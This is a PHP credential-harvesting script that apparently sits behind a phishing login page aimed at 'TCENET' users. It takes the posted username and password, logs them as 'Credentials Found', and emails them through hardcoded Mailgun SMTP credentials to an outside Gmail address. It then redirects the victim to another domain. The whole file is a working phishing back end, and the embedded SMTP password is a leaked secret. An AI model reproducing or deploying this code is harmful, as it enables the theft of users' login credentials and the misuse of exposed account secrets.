<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require '../vendor/autoload.php';

$username = $_POST['username'];
$password = $_POST['password'];
$res = "[+] Username: $username <--|+|--> Password: $password";
error_log("[+] Credentials Found!!!");
error_log("$res");

$message = "Username: $username <--|+|--> Password: $password";
$mail = new PHPMailer;
$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.mailgun.org';                     // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = 'postmaster@sandboxb27249119e714c3da81d670ee2899d91.mailgun.org';   // SMTP username
$mail->Password = '53469cc7a08c50cca70506c0d3968848-e438c741-0d18c6e9';                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable encryption, only 'tls' is accepted

$mail->From = 'postmaster@sandboxb27249119e714c3da81d670ee2899d91.mailgun.org';
$mail->FromName = 'Postmaster MailGun';
$mail->addAddress('faceprepindia@gmail.com');                 // Add a recipient

$mail->WordWrap = 50;                                 // Set word wrap to 50 characters

$mail->Subject = "TCENET - Credentials Found!!!";
$mail->Body    = "{$message}";

$result = $mail->Send();

if($result == 1){
echo "<script type='text/javascript'>window.location='https://zaptech.zapto.org'</script>";
}
else{
    echo "ERROR";
}

exit();

?>
